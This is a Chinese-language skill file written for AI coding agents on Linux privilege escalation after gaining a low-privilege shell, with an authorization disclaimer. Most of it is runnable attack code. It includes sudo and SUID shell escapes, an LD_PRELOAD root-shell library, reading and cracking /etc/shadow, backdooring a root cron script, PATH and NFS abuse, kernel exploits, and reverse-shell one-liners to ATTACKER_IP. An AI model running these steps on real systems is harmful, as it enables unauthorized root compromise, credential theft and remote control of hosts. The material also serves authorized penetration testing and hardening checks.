---
name: linux-privilege-escalation
title: Linux 提权评估
description: 当持有低权限 shell 需在授权范围内系统化排查并利用 Linux 配置缺陷提权到 root 时使用；做枚举-定位-利用全流程评估，产出提权路径、证据日志与修复建议；不适用于未授权渗透、Windows 提权或纯漏洞扫描。触发词：Linux提权、privilege escalation、SUID、sudo -l、GTFOBins
domain: 安全/ops
triggers: [Linux 提权, privilege escalation, 提权评估, SUID 利用, sudo -l, GTFOBins, 内核提权, cron 提权, capabilities 提权, PATH 劫持, LinPEAS, 提到 root, NFS no_root_squash]
tags: [安全, 渗透测试, 权限提升, Linux, 红队, misc]
level: 进阶
status: stable
agents: [claude-code, codex, cursor, gemini-cli]
tools: [Bash, gcc, LinPEAS, linux-exploit-suggester, GTFOBins, John the Ripper, netcat]
requires: []
related: [active-directory-attacks, penetration-testing-methodology, cloud-penetration-testing, red-team-recon]
combines_with: [penetration-testing-methodology, red-team-recon, aws-penetration-testing]
license: MIT
source: sickn33/antigravity-awesome-skills
source_license: MIT
---
> 仅限授权使用：本技能只能用于已获书面授权的安全评估、防御验证或受控教学环境。提权前必须确认授权范围。

# Linux 提权评估

在已拿到低权限 shell 的 Linux 主机上，系统化枚举并利用错误配置、脆弱服务与内核漏洞，将权限从普通用户提升到 root。产出可复现的提权路径、命令输出证据与修复建议。

## 何时使用

适用场景：
- 已通过渗透/红队拿到目标 Linux 主机的低权限交互式或半交互式 shell，需进一步提权。
- 防御方做加固验证，验证 SUID / sudo / cron / capabilities / NFS 等配置是否可被滥用。
- 受控教学/靶机环境演练提权技术。

前置条件：能执行命令的 shell；如需反弹 shell 需具备到攻击机的网络出口；自定义内核 exploit 需了解 gcc 编译。

不该用于：
- 任何未获书面授权的目标（越权即违法）。
- Windows 提权、容器逃逸专题、纯漏洞扫描（无 shell 仅扫端口）——本技能聚焦已有立足点后的 Linux 本地提权。
- 内核 exploit 慎用于生产：失败可能导致系统崩溃，须先在测试环境验证。

## 步骤

按「枚举 → 选向量 → 利用 → 取证」推进，向量之间无强依赖，按收益优先尝试。

1. 系统枚举：摸清内核版本、用户/权限、网络、进程、环境变量与 PATH。
2. 自动化枚举：上传并审阅后运行 LinPEAS / LinEnum / lse / linux-exploit-suggester，快速汇总可疑点。
3. 逐向量利用（优先低风险高收益）：sudo 配置 → SUID 二进制 → capabilities → cron 可写脚本 → PATH 劫持 → NFS no_root_squash → 内核 exploit（风险最高，放最后）。
4. 取证与修复：记录每条提权路径、执行的命令与产生的变更，保留 `id`/输出日志作为证据，给出修复建议。

## 指令

### 1. 系统枚举
```bash
uname -a; cat /proc/version; cat /etc/*-release   # 内核与发行版（供漏洞研究）
whoami; id; groups                                # 当前身份与组
cat /etc/passwd | grep -v nologin | grep -v false # 可登录用户
ip addr; ip route; ss -tulpn                       # 网络/监听服务
ps aux | grep root                                 # 以 root 运行的进程
env; echo $PATH                                    # 环境变量与 PATH（劫持线索）
```

### 2. 自动化枚举（先下载、审阅，再在授权环境执行）
```bash
# 攻击机起 HTTP 服务
python3 -m http.server 8000
# 目标机下载并审阅后执行
curl -L -o linpeas.sh https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
less linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
./LinEnum.sh -t ; ./lse.sh -l 1 ; ./linux-exploit-suggester.sh
```

### 3. sudo 利用
```bash
sudo -l                                  # 枚举可免密/可用命令
# GTFOBins 套路（按 sudo -l 结果选）
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/bash'
sudo awk 'BEGIN {system("/bin/bash")}'
sudo python -c 'import os; os.system("/bin/bash")'
```
当 `env_keep` 含 `LD_PRELOAD` 时：
```c
// shell.c
#include <stdio.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
```
```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so find
```

### 4. SUID 利用
```bash
find / -perm -u=s -type f 2>/dev/null          # 查 SUID 二进制
# GTFOBins 套路示例
find . -exec /bin/sh -p \; -quit                # find 带 SUID
cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p   # cp 可写
base64 /etc/shadow | base64 -d                  # base64 带 SUID 读 shadow
# 离线破解
unshadow passwd.txt shadow.txt > hashes.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

### 5. capabilities 利用
```bash
getcap -r / 2>/dev/null
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'   # cap_setuid
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

### 6. cron 可写脚本
```bash
cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers
# 若 root cron 调用可写脚本
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh   # 等待执行后 /tmp/bash -p
```

### 7. PATH 劫持（SUID 调用了未带绝对路径的外部命令）
```bash
strings /usr/local/bin/suid-binary       # 发现 system("service ...")
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\n/bin/bash -p' > /tmp/service && chmod +x /tmp/service
/usr/local/bin/suid-binary
```

### 8. NFS no_root_squash
```bash
cat /etc/exports                         # 目标：查找 no_root_squash
# 攻击机（root）
showmount -e TARGET_IP; mount -o rw TARGET_IP:/share /tmp/nfs
echo 'int main(){setuid(0);setgid(0);system("/bin/bash");return 0;}' > /tmp/nfs/shell.c
gcc /tmp/nfs/shell.c -o /tmp/nfs/shell && chmod +s /tmp/nfs/shell
# 目标机执行 /share/shell
```

### 9. 内核 exploit（最后手段，先在测试环境验证）
```bash
uname -r; searchsploit linux kernel [version]
gcc exploit.c -o exploit && ./exploit
```
| 内核版本 | Exploit | CVE |
|---|---|---|
| 2.6.x–3.x | Dirty COW | CVE-2016-5195 |
| 4.4.x–4.13.x | Double Fetch | CVE-2017-16995 |
| 5.8+ | Dirty Pipe | CVE-2022-0847 |

### 反弹 shell 速查
```bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
nc -e /bin/bash ATTACKER_IP 4444
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

## 示例

示例一 · sudo find 提权：`sudo -l` 显示 `(root) NOPASSWD: /usr/bin/find` → 执行 `sudo find . -exec /bin/bash \; -quit` → `id` 返回 `uid=0(root)`。

示例二 · SUID base64 读 shadow：`find / -perm -u=s -type f 2>/dev/null | grep base64` 命中 `/usr/bin/base64` → `base64 /etc/shadow | base64 -d` 导出哈希 → `john --wordlist=rockyou.txt shadow.txt` 离线破解。

示例三 · cron 脚本劫持：`/etc/crontab` 中 `* * * * * root /opt/scripts/backup.sh`，且该脚本 `-rwxrwxrwx` 可写 → `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /opt/scripts/backup.sh` → 等 1 分钟后 `/tmp/bash -p` 拿到 `euid=0(root)`。

## 注意事项

- 授权与合规：测试前需书面授权；严守 scope 边界；发现高危立即上报；不触碰范围外数据。
- 操作安全：内核 exploit 须先在测试环境验证（失败可能崩系统）；记录全部变更；仅在授权范围内维持权限/持久化。
- 技术限制：现代内核有 ASLR/SMEP/SMAP 缓解；AppArmor/SELinux 可能拦截利用；容器环境难做内核级提权；加固系统 sudo 配置受限。
- 排障要点：编译失败先 `which gcc`、换攻击机同架构编译或 `gcc -static`；反弹 shell 连不上试 443/80 端口并检查出口过滤；SUID 不可利用时核对版本是否匹配 GTFOBins、检查是否主动 drop 权限；cron 不触发用 `service cron status` 确认并核对 crontab 内的 PATH 与 `+x` 权限。

## 互见

- GTFOBins：https://gtfobins.github.io （SUID/sudo 二进制利用查询）
- LinPEAS / PEASS-ng：https://github.com/carlospolop/PEASS-ng
- Linux Exploit Suggester：https://github.com/mzet-/linux-exploit-suggester

---
采编自 sickn33/antigravity-awesome-skills（原作者 zebbern，MIT 许可）。
